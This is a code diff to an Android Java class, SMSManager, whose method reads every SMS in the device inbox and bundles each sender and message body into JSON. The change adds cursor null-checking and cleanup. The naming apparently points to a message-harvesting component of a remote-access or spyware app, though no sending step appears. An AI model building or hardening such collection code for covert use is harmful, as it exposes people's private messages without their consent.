@@ -16,29 +16,31 @@ import org.json.JSONObject;
 public class SMSManager {
 
     public static JSONObject getSMSList(){
-
+        Cursor cur = null;
         try {
             JSONObject SMSList = new JSONObject();
             JSONArray list = new JSONArray();
 
-
             Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            Cursor cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
+            cur = MainService.getContextOfApplication().getContentResolver().query(uriSMSURI, null, null, null, null);
 
-            while (cur.moveToNext()) {
-                JSONObject sms = new JSONObject();
-                String address = cur.getString(cur.getColumnIndex("address"));
-                String body = cur.getString(cur.getColumnIndexOrThrow("body"));
-                sms.put("phoneNo" , address);
-                sms.put("msg" , body);
-                list.put(sms);
-
+            if (cur != null) {
+                while (cur.moveToNext()) {
+                    JSONObject sms = new JSONObject();
+                    String address = cur.getString(cur.getColumnIndex("address"));
+                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
+                    sms.put("phoneNo", address);
+                    sms.put("msg", body);
+                    list.put(sms);
+                }
             }
             SMSList.put("smsList", list);
-            Log.e("done" ,"collecting");
+            Log.e("done", "collecting");
             return SMSList;
         } catch (JSONException e) {
             e.printStackTrace();
+        } finally {
+            if (cur != null) cur.close();
         }
 
         return null;
